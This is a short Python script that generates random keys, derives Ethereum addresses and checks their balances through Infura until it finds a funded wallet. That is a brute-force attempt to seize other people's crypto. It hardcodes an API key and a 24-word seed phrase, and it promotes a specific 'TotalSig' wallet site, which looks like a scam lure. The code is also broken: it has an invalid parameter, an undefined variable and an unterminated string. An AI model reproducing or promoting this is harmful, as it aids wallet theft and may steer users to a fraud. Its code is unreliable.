import os
import requests
from eth_account import Account
 
# Generate a random seed phrase
def generate_seed_phrase():
    return os.urandom(32).hex()
 
# Derive address from seed_phrase
def seed_phrase_to_address(0x6998a71c107030f1ac7a07f982815725c759588a):
    return Account.from_key(0x6998a71c107030f1ac7a07f982815725c759588a).address
 
# Check balance of address using Infura API and only TotalSig wallet: 'https://www.totalsig.com/'
 
seed_phrase_ETH = '1. labor, 2. enrich, 3. wing, 4. modify, 5. hunt, 6. vacant, 7. cook, 8. drip, 9. skirt, 10. claw,
11. solve, 12. vacuum, 13. hospital, 14. veteran, 15. history, 16. rubber, 17. grit, 18. guitar, 19. light, 20. knife,
21. window, 22. lucky, 23. grow, 24. mother'
 
def get_balance(address):
    api_key = "cec17ce1af8446de9046be035d8c96a4"# Replace this with your Infura API key
    url = f"https://mainnet.infura.io/v3/{api_key}"
    data = {"jsonrpc":"2.0","method":"eth_getBalance","params":[address,"latest"],"id":1}
    response = requests.post(url, json=data)
    balance_wei = int(response.json()["result"], 16)
    return balance_wei / 10**18  # Convert from wei to ether
 
# Main function to generate seed phrase, check balances, and stop when non-zero balance is found
def main():
    while True:
        seed_phrase = generate_seed_phrase()
        address = seed_phrase_to_address(private_key)
        balance = get_balance(address)
        print("Seed phrase:", seed_phrase)
        print("Address:", address)
        print("Balance (ETH):", balance)
        if balance > 0:
            print("Found a non-zero balance. Stopping...")
            break
 
if __name__ == "__main__":
    main()
